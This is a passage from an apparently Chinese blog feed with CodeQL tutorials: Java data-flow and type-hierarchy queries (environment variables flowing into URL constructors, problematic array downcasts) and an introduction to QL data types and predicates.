src, &quot;This string constructs a URL $@.&quot;, sink, &quot;here&quot;</span><br></pre></td></tr></table></figure><h3 id="练习3"><a href="#练习3" class="headerlink" title="练习3"></a>练习3</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">class GetenvSource extends MethodAccess &#123;</span><br><span class="line">  GetenvSource() &#123;</span><br><span class="line">    <span class="keyword">exists</span>(<span class="keyword">Method</span> m <span class="operator">|</span> m <span class="operator">=</span> this.getMethod() <span class="operator">|</span></span><br><span class="line">      m.hasName(&quot;getenv&quot;) <span class="keyword">and</span></span><br><span class="line">      m.getDeclaringType() instanceof TypeSystem</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="练习4"><a href="#练习4" class="headerlink" title="练习4"></a>练习4</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import semmle.code.java.dataflow.DataFlow</span><br><span class="line"></span><br><span class="line">class GetenvSource extends DataFlow::ExprNode &#123;</span><br><span class="line">  GetenvSource() &#123;</span><br><span class="line">    <span class="keyword">exists</span>(<span class="keyword">Method</span> m <span class="operator">|</span> m <span class="operator">=</span> this.asExpr().(MethodAccess).getMethod() <span class="operator">|</span></span><br><span class="line">      m.hasName(&quot;getenv&quot;) <span class="keyword">and</span></span><br><span class="line">      m.getDeclaringType() instanceof TypeSystem</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class GetenvToURLConfiguration extends DataFlow::Configuration &#123;</span><br><span class="line">  GetenvToURLConfiguration() &#123;</span><br><span class="line">    this <span class="operator">=</span> &quot;GetenvToURLConfiguration&quot;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    source instanceof GetenvSource</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    <span class="keyword">exists</span>(<span class="keyword">Call</span> <span class="keyword">call</span> <span class="operator">|</span></span><br><span class="line">      sink.asExpr() <span class="operator">=</span> call.getArgument(<span class="number">0</span>) <span class="keyword">and</span></span><br><span class="line">      call.getCallee().(Constructor).getDeclaringType().hasQualifiedName(&quot;java.net&quot;, &quot;URL&quot;)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> DataFlow::Node src, DataFlow::Node sink, GetenvToURLConfiguration config</span><br><span class="line"><span class="keyword">where</span> config.hasFlow(src, sink)</span><br><span class="line"><span class="keyword">select</span> src, &quot;This environment variable constructs a URL $@.&quot;, sink, &quot;here&quot;</span><br></pre></td></tr></table></figure><h1 id="Java中的类型-Types-in-Java"><a href="#Java中的类型-Types-in-Java" class="headerlink" title="Java中的类型(Types in Java)"></a>Java中的类型(Types in Java)</h1><p>开发人员可以使用CodeQL查找有关Java代码中使用的数据类型的有关信息，有助于识别特定的类型相关问题。</p><h2 id="使用Java类型（About-working-with-Java-types）"><a href="#使用Java类型（About-working-with-Java-types）" class="headerlink" title="使用Java类型（About working with Java types）"></a>使用Java类型（About working with Java types）</h2><p>CodeQL的Java标准库中用<code>Type</code>以及它的子类型表示Java类型。<br>例如，类<code>PrimitiveType</code>表示Java语言中的基础类型（例如<code>int,boolean</code>等），而类<code>RefType</code>和它的子类表示Java中的引用类型，例如类，接口，数组等（包括Java标准库中的类型Object等，和非标准库中定义的类型）。<code>RefType</code>类还可以用来查询类之间的继承关系：成员谓词<code>getSupertype</code>和<code>getSubtype</code>可以查找某应用类型的父类和子类。以如下Java程序为例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;&#125;</span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">I</span> &#123;&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> <span class="keyword">extends</span> <span class="title class_">A</span> <span class="keyword">implements</span> <span class="title class_">I</span> &#123;&#125;</span><br></pre></td></tr></table></figure><p>类A和接口I都仅具有一个直接父类（java.lang.Object）和一个直接子类（B）,而类B有两个直接父类（A和I），没有直接子类。<br>可以使用传递闭包来查找一个类型的祖先类型（包括直接父类和间接父类），如下代码则查询上述代码中的所有祖先：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java </span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> class B </span><br><span class="line"><span class="keyword">where</span> B.hasName(&quot;B&quot;)</span><br><span class="line"><span class="keyword">select</span> B.getASupertype<span class="operator">+</span>()</span><br></pre></td></tr></table></figure><p>注意</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果想在结果中看到A和B，需要将`B.getASupertype+()` 换成`B.getASupertype*()`。</span><br></pre></td></tr></table></figure><p>除了查找引用类型的继承关系外，<code>RefType</code>包含谓词<code>GetAMember</code>来查找类的成员，例如字段，构造函数和方法等，谓词<code>inherits(Method m)</code>来检验引用类型是否声明(或实现)了方法<code>m</code>。</p><h2 id="示例：查找有问题的数组强制转换-Example-Finding-problematic-array-casts"><a href="#示例：查找有问题的数组强制转换-Example-Finding-problematic-array-casts" class="headerlink" title="示例：查找有问题的数组强制转换(Example:Finding problematic array casts)"></a>示例：查找有问题的数组强制转换(Example:Finding problematic array casts)</h2><p>接下来，为了更好的理解类层次关系的API，介绍一个通过查询来查找向下强转类型的数组。向下强转是指类型<code>A []</code> 转化成类型<code>B []</code>，而B是A的子类（不一定是直接继承关系）。<br>大部分时候，向下转换数组会导致运行时异常，即使每个单独的数组元素都可以向下转换也是如此。 例如，以下代码引发<code>ClassCastException</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Object[] o = <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;Hello&quot;</span>, <span class="string">&quot;world&quot;</span> &#125;;</span><br><span class="line">String[] s = (String[])o;</span><br></pre></td></tr></table></figure><p>另一方面，如果表达式<code>e</code>恰好为<code>B[]</code>数组，则转换将成功：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Object[] o = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;Hello&quot;</span>, <span class="string">&quot;world&quot;</span> &#125;;</span><br><span class="line">String[] s = (String[])o;</span><br></pre></td></tr></table></figure><p>本例中不区分这两种情况，该查询仅查找一些从类型<code>source</code>转化到类型<code>target</code>的表达式，即</p><ul><li><code>source</code>和<code>target</code>都是数组类型。</li><li><code>source</code>是<code>target</code>的中元素的祖先类型。<br>相关实现如下：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> CastExpr ce, <span class="keyword">Array</span> source, <span class="keyword">Array</span> target</span><br><span class="line"><span class="keyword">where</span> source <span class="operator">=</span> ce.getExpr().getType() <span class="keyword">and</span></span><br><span class="line">    target <span class="operator">=</span> ce.getType() <span class="keyword">and</span></span><br><span class="line">    target.getElementType().(RefType).getASupertype<span class="operator">+</span>() <span class="operator">=</span> source.getElementType()</span><br><span class="line"><span class="keyword">select</span> ce, &quot;Potentially problematic array downcast.&quot;</span><br></pre></td></tr></table></figure>注意到，通过将<code>target.getElementType()</code>转化为<code>RefType</code>，上述代码剔除了元素类型为基础类型的所有情况。也就是说，如果<code>target</code>的元素类型为基础类型，那么这个表达式就不成立。和Java不同，QL的强转永远不会失败。如果一个表达式不能被强转为目标类型，那么这个表达式不会出现在结果中。</li></ul><h2 id="改进-Improvements"><a href="#改进-Improvements" class="headerlink" title="改进(Improvements)"></a>改进(Improvements)</h2><p>在jdk5之前的旧Java代码上运行上述查询会产生一些误报，这是由于一个将集合类型转化为数组类型的函数<code>Collection.toArray(T[])</code>导致的。<br>在不使用泛型的代码中，该方法通常按照下述方式使用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">List</span> <span class="variable">l</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line"><span class="comment">// add some element of type A to l</span></span><br><span class="line">A[] as = (A[])l.toArray(<span class="keyword">new</span> <span class="title class_">A</span>[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure><p>上述例子中，<code>l</code>的类型为<code>List</code>，所以<code>l.toArray()</code>返回的类型为<code>Object []</code>，和其当中元素的类型无关。因此，<code>Object[]</code>转换到<code>A[]</code>，并将上述查询标记为有问题，尽管在运行时此转换永远不会出错。<br>为了识别这些情况，可以创建两个CodeQL类，分别表示<code>Collection.toArray</code>方法，和调用此方法，或者重写(override)该方法的任何方法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** class representing java.util.Collection.toArray(T[]) */</span></span><br><span class="line">class CollectionToArray extends <span class="keyword">Method</span> &#123;</span><br><span class="line">    CollectionToArray() &#123;</span><br><span class="line">        this.getDeclaringType().hasQualifiedName(&quot;java.util&quot;, &quot;Collection&quot;) <span class="keyword">and</span></span><br><span class="line">        this.hasName(&quot;toArray&quot;) <span class="keyword">and</span></span><br><span class="line">        this.getNumberOfParameters() <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** class representing calls to java.util.Collection.toArray(T[]) */</span></span><br><span class="line">class CollectionToArrayCall extends MethodAccess &#123;</span><br><span class="line">    CollectionToArrayCall() &#123;</span><br><span class="line">        <span class="keyword">exists</span>(CollectionToArray m <span class="operator">|</span></span><br><span class="line">            this.getMethod().getSourceDeclaration().overridesOrInstantiates<span class="operator">*</span>(m)</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** the call&#x27;s actual return type, as determined from its argument */</span></span><br><span class="line">    <span class="keyword">Array</span> getActualReturnType() &#123;</span><br><span class="line">        <span class="keyword">result</span> <span class="operator">=</span> this.getArgument(<span class="number">0</span>).getType()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到在类<code>CollectionToArray</code>中的构造谓词中使用了<code>getSourceDeclaration</code>和<code>overridesOrInstantiates</code>，这有助于发现所有调用<code>Collection.toArray</code>的函数，以及重写该方法和实例调用的方法。例如，在上面的示例中，调<code>l.toArray</code>解析为原始类<code>ArrayList</code>中的方法<code>toArray</code>。它的源声明是泛型类<code>ArrayList&lt;T&gt;</code>中的<code>toArray</code>，它重写<code>AbstractCollection&lt;T&gt;.toArray</code>，而后者又重写<code>Collection&lt;T&gt;.toArray</code>，后者是<code>Collection.toArray</code>的一个实例化（因为重写方法中的类型参数T属于<code>ArrayList</code>，并且是属于集合的类型参数的实例化）。<br>使用这些新类，我们可以扩展查询以排除对类型为<code>A[]</code>的参数的<code>toArray</code>调用，然后将其强制转换为<code>A[]</code>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> <span class="keyword">Insert</span> the class definitions <span class="keyword">from</span> above</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> CastExpr ce, <span class="keyword">Array</span> source, <span class="keyword">Array</span> target</span><br><span class="line"><span class="keyword">where</span> source <span class="operator">=</span> ce.getExpr().getType() <span class="keyword">and</span></span><br><span class="line">    target <span class="operator">=</span> ce.getType() <span class="keyword">and</span></span><br><span class="line">    target.getElementType().(RefType).getASupertype<span class="operator">+</span>() <span class="operator">=</span> source.getElementType() <span class="keyword">and</span></span><br><span class="line">    <span class="keyword">not</span> ce.getExpr().(CollectionToArrayCall).getActualReturnType() <span class="operator">=</span> target</span><br><span class="line"><span class="keyword">select</span> ce, &quot;Potentially problematic array downcast.&quot;</span><br></pre></td></tr></table></figure><h2 id="查找不匹配包含检查-Example-Finding-mismatched-contains-checks"><a href="#查找不匹配包含检查-Example-Finding-mismatched-contains-checks" class="headerlink" title="查找不匹配包含检查(Example:Finding mismatched contains checks)"></a>查找不匹配包含检查(Example:Finding mismatched contains checks)</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Java-代码的基本查询（Basic-query-for-Java-code）&quot;&gt;&lt;a href=&quot;#Java-代码的基本查询（Basic-query-for-Java-code）&quot; class=&quot;headerlink&quot; title=&quot;Java 代码的基本查询（B</summary>
      
    
    
    
    
    <category term="Java" scheme="http://che35tnut.github.io/tags/Java/"/>
    
    <category term="CodeQL" scheme="http://che35tnut.github.io/tags/CodeQL/"/>
    
  </entry>
  
  <entry>
    <title>CodeQL 基础知识</title>
    <link href="http://che35tnut.github.io/2021/09/06/210906-CodeQL-Basic/"/>
    <id>http://che35tnut.github.io/2021/09/06/210906-CodeQL-Basic/</id>
    <published>2021-09-06T07:32:45.000Z</published>
    <updated>2022-10-12T11:31:08.897Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h1><p>QL是一种强类型的语言，必须先定义变量再使用变量。</p><h2 id="整型-int"><a href="#整型-int" class="headerlink" title="整型-int"></a>整型-int</h2> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* int 类型 */</span></span><br><span class="line"><span class="keyword">from</span> <span class="type">int</span> num, <span class="operator">/</span><span class="operator">/</span> 定义一个<span class="type">int</span>类型的num变量</span><br><span class="line"><span class="keyword">where</span> num<span class="operator">=</span><span class="number">5</span>  <span class="operator">/</span><span class="operator">/</span>给num变量赋值为<span class="number">5</span></span><br><span class="line"><span class="keyword">select</span> num.pow(<span class="number">2</span>) <span class="operator">/</span><span class="operator">/</span>求num的平方值</span><br></pre></td></tr></table></figure><h2 id="浮点型-float"><a href="#浮点型-float" class="headerlink" title="浮点型-float"></a>浮点型-float</h2> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> <span class="type">float</span> x</span><br><span class="line"><span class="keyword">where</span> x<span class="operator">=</span><span class="number">0.36</span></span><br><span class="line"><span class="keyword">select</span> x.<span class="built_in">sqrt</span>()</span><br></pre></td></tr></table></figure><h2 id="字符串型-string"><a href="#字符串型-string" class="headerlink" title="字符串型-string"></a>字符串型-string</h2> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> string str1, string str2 <span class="operator">/</span><span class="operator">/</span>变量类型要单独声明，不存在string str1,str2。这种类型的定义</span><br><span class="line"><span class="keyword">where</span> str1<span class="operator">=</span>&quot;Hello&quot; <span class="keyword">and</span> str2<span class="operator">=</span>&quot;World&quot; <span class="operator">/</span><span class="operator">/</span>定义用<span class="keyword">and</span>连接</span><br><span class="line"><span class="keyword">select</span> str1.toLowerCase(), str2.toUpperCase(), str1.length() <span class="keyword">as</span> lengthOfStr1 <span class="operator">/</span><span class="operator">/</span>将str1.length()表征为lengthOfStr</span><br></pre></td></tr></table></figure><p> 结果：</p><table><thead><tr><th>#</th><th>[0]</th><th>[1]</th><th>lengthOfStr1</th></tr></thead><tbody><tr><td>1</td><td>hello</td><td>WORLD</td><td>5</td></tr></tbody></table><!--![运行结果](210906-CodeQL-Basic/StringResult.png)--><h2 id="日期型-date"><a href="#日期型-date" class="headerlink" title="日期型-date"></a>日期型-date</h2> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> <span class="type">date</span> <span class="keyword">start</span>, <span class="type">date</span> now</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">start</span><span class="operator">=</span>&quot;01/01/2019&quot;.toDate() <span class="keyword">and</span> now<span class="operator">=</span>&quot;06/09/2021&quot;.toDate() <span class="operator">/</span><span class="operator">/</span>dd<span class="operator">/</span>mm<span class="operator">/</span>yyyy</span><br><span class="line"><span class="keyword">select</span> start.daysTo(now)</span><br></pre></td></tr></table></figure><h2 id="布尔型-boolean"><a href="#布尔型-boolean" class="headerlink" title="布尔型-boolean"></a>布尔型-boolean</h2> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> <span class="type">boolean</span> flag</span><br><span class="line"><span class="keyword">where</span> flag <span class="operator">=</span> <span class="literal">false</span></span><br><span class="line"><span class="keyword">select</span> flag.booleanNot()</span><br></pre></td></tr></table></figure><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ul><li><a href="https://codeql.github.com/docs/ql-language-reference/ql-language-specification/">https://codeql.github.com/docs/ql-language-reference/ql-language-specification/</a></li></ul><h1 id="谓词-Predicates"><a href="#谓词-Predicates" class="headerlink" title="谓词 Predicates"></a>谓词 Predicates</h1><p>谓词用来描述QL成语中的逻辑关系(函数？).<br>定义谓词:</p><ul><li>关键字predicate（对于没有结果的谓词），或者结果的类型（对于具有结果的谓词）</li><li>谓词的名称。这是一个 以小写字母开头的标识符</li><li>谓词的参数（如果有）以逗号分隔。对于每个参数，请指定参数类型和参数变量的标识符</li><li>谓词体本身。这是用大括号括起来的逻辑公式。</li></ul><h2 id="无结果的谓词-Predicates-without-result"><a href="#无结果的谓词-Predicates-without-result" class="headerlink" title="无结果的谓词(Predicates without result)"></a>无结果的谓词(Predicates without result)</h2><p>以关键字predicate开头定义。如果值满足主体中的逻辑属性，则谓词将保留该值。<br> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义谓词isCountry</span></span><br><span class="line">predicate <span class="title function_">isCountry</span><span class="params">(string country)</span> &#123;</span><br><span class="line">    country = <span class="string">&quot;China&quot;</span> </span><br><span class="line">    <span class="type">or</span></span><br><span class="line">    <span class="variable">country</span> <span class="operator">=</span> <span class="string">&quot;Jappan&quot;</span> </span><br><span class="line">    <span class="type">or</span> </span><br><span class="line">    <span class="variable">country</span> <span class="operator">=</span> <span class="string">&quot;German&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">from string country</span><br><span class="line"><span class="type">where</span> <span class="variable">country</span> <span class="operator">=</span> <span class="string">&quot;China&quot;</span> and <span class="title function_">isCountry</span><span class="params">(country)</span> <span class="comment">// isCountry对country做出操作</span></span><br><span class="line">select country</span><br></pre></td></tr></table></figure><br>结果：</p><table><thead><tr><th>#</th><th>country</th></tr></thead><tbody><tr><td>1</td><td>China</td></tr></tbody></table><!-- ![结果](210906-CodeQL-Basic/PridicatesWithoutResult.png) --><p>如果更改<code>country=&quot;USA&quot;</code>，结果为空。</p><!-- ![结果](210906-CodeQL-Basic/PridicatesWithoutResult2.png) --><p>在这种情况下谓词起到了过滤器的作用，仅留下满足条件的结果。</p><h2 id="有结果的谓词-Predicates-with-result"><a href="#有结果的谓词-Predicates-with-result" class="headerlink" title="有结果的谓词(Predicates with result)"></a>有结果的谓词(Predicates with result)</h2><p>有结果的谓词更类似于编程语言里的函数，有一个返回值。将关键字(predicate)替换为结果的类型来定义带有结果的谓词，其中结果用result来表示。</p><h3 id="示例1"><a href="#示例1" class="headerlink" title="示例1"></a>示例1</h3> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> getSuccessor(<span class="type">int</span> i)&#123;</span><br><span class="line">    <span class="keyword">result</span><span class="operator">=</span>i<span class="operator">+</span><span class="number">1</span> <span class="keyword">and</span> i <span class="keyword">in</span> [<span class="number">1</span> .. <span class="number">9</span>]</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">from</span> <span class="type">int</span> x</span><br><span class="line"><span class="keyword">where</span> x <span class="operator">=</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">select</span> getSuccessor(x)</span><br></pre></td></tr></table></figure><p>如果 $ 0 \leq i \leq 9 $，返回i后一个数。<br>结果为2。</p><h3 id="示例2"><a href="#示例2" class="headerlink" title="示例2"></a>示例2</h3><p>谓词也可以返回多个或0个结果。<br> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> getNeighbor(<span class="type">int</span> i)&#123;</span><br><span class="line">    i <span class="keyword">in</span> [<span class="number">1</span> .. <span class="number">9</span>] <span class="keyword">and</span> <span class="keyword">result</span> <span class="operator">=</span> i<span class="number">-1</span></span><br><span class="line">    <span class="keyword">or</span></span><br><span class="line">    i <span class="keyword">in</span> [<span class="number">1</span> .. <span class="number">9</span>] <span class="keyword">and</span> <span class="keyword">result</span> <span class="operator">=</span> i<span class="operator">+</span><span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">select</span> getNeighbor(<span class="number">9</span>)</span><br><span class="line"><span class="keyword">from</span> <span class="type">int</span> x </span><br><span class="line"><span class="keyword">where</span> x <span class="operator">=</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">select</span> getNeighbor(x) <span class="keyword">as</span> <span class="keyword">Result</span></span><br></pre></td></tr></table></figure><br>返回i的前一个数和后一个数：结果为：</p><table><thead><tr><th>Result</th></tr></thead><tbody><tr><td>0</td></tr><tr><td>2</td></tr></tbody></table><h3 id="示例3"><a href="#示例3" class="headerlink" title="示例3"></a>示例3</h3>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">string getANeighbor(string country) &#123;</span><br><span class="line">   country <span class="operator">=</span> &quot;France&quot; <span class="keyword">and</span> <span class="keyword">result</span> <span class="operator">=</span> &quot;Belgium&quot;</span><br><span class="line">   <span class="keyword">or</span></span><br><span class="line">   country <span class="operator">=</span> &quot;France&quot; <span class="keyword">and</span> <span class="keyword">result</span> <span class="operator">=</span> &quot;Germany&quot;</span><br><span class="line">   <span class="keyword">or</span></span><br><span class="line">   country <span class="operator">=</span> &quot;Germany&quot; <span class="keyword">and</span> <span class="keyword">result</span> <span class="operator">=</span> &quot;Austria&quot;</span><br><span class="line">   <span class="keyword">or</span></span><br><span class="line">   country <span class="operator">=</span> &quot;Germany&quot; <span class="keyword">and</span> <span class="keyword">result</span> <span class="operator">=</span> &quot;Belgium&quot;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h2 id="递归谓词（Recursive-predicates）"><a href="#递归谓词（Recursive-predicates）" class="headerlink" title="递归谓词（Recursive predicates）"></a>递归谓词（Recursive predicates）</h2><p>谓词可以是递归的。(我的理解：由result倒推逻辑)<br><a href="#%E7%A4%BA%E4%BE%8B3">上一节示例3</a>无法捕捉这类情形：如果x是y的邻居，那么y也是x的邻居。<br> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">string getANeighbor(string country) &#123;</span><br><span class="line">    country <span class="operator">=</span> &quot;France&quot; <span class="keyword">and</span> <span class="keyword">result</span> <span class="operator">=</span> &quot;Belgium&quot;</span><br><span class="line">    <span class="keyword">or</span></span><br><span class="line">    country <span class="operator">=</span> &quot;France&quot; <span class="keyword">and</span> <span class="keyword">result</span> <span class="operator">=</span> &quot;Germany&quot;</span><br><span class="line">    <span class="keyword">or</span></span><br><span class="line">    country <span class="operator">=</span> &quot;Germany&quot; <span class="keyword">and</span> <span class="keyword">result</span> <span class="operator">=</span> &quot;Austria&quot;</span><br><span class="line">    <span class="keyword">or</span></span><br><span class="line">    country <span class="operator">=</span> &quot;Germany&quot; <span class="keyword">and</span> <span class="keyword">result</span> <span class="operator">=</span> &quot;Belgium&quot;</span><br><span class="line">    <span class="keyword">or</span></span><br><span class="line">    country <span class="operator">=</span> getANeighbor(<span class="keyword">result</span>) <span class="operator">/</span><span class="operator">/</span> 由<span class="keyword">result</span>倒推country.</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">from</span> string x </span><br><span class="line"><span class="keyword">where</span> x <span class="operator">=</span> &quot;Belgium&quot;</span><br><span class="line"><span class="keyword">select</span> getANeighbor(x)</span><br></pre></td></tr></table></figure></p><p>结果为：</p><table><thead><tr><th>Result</th></tr></thead><tbody><tr><td>France</td></tr><tr><td>Germany</td></tr></tbody></table><h2 id="谓词的种类-Kinds-of-predicates"><a href="#谓词的种类-Kinds-of-predicates" class="headerlink" title="谓词的种类(Kinds of predicates)"></a>谓词的种类(Kinds of predicates)</h2><p>谓词有三类：非成员谓词（non-member predicates），成员谓词（member predicates）和特征谓词 （ characteristic predicates）.<br><font color="red">如何调用成员谓词和特征谓词？</font><br> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> getSuccessor(<span class="type">int</span> i) &#123;  <span class="operator">/</span><span class="operator">/</span> <span class="number">1.</span>非成员谓词，不是类的成员 Non<span class="operator">-</span><span class="keyword">member</span> predicate</span><br><span class="line">  <span class="keyword">result</span> <span class="operator">=</span> i <span class="operator">+</span> <span class="number">1</span> <span class="keyword">and</span></span><br><span class="line">  i <span class="keyword">in</span> [<span class="number">1</span> .. <span class="number">9</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class FavoriteNumbers extends <span class="type">int</span> &#123;</span><br><span class="line">  FavoriteNumbers() &#123;  <span class="operator">/</span><span class="operator">/</span> <span class="number">2.</span> 特征谓词 Characteristic predicate ???</span><br><span class="line">    this <span class="operator">=</span> <span class="number">1</span> <span class="keyword">or</span></span><br><span class="line">    this <span class="operator">=</span> <span class="number">4</span> <span 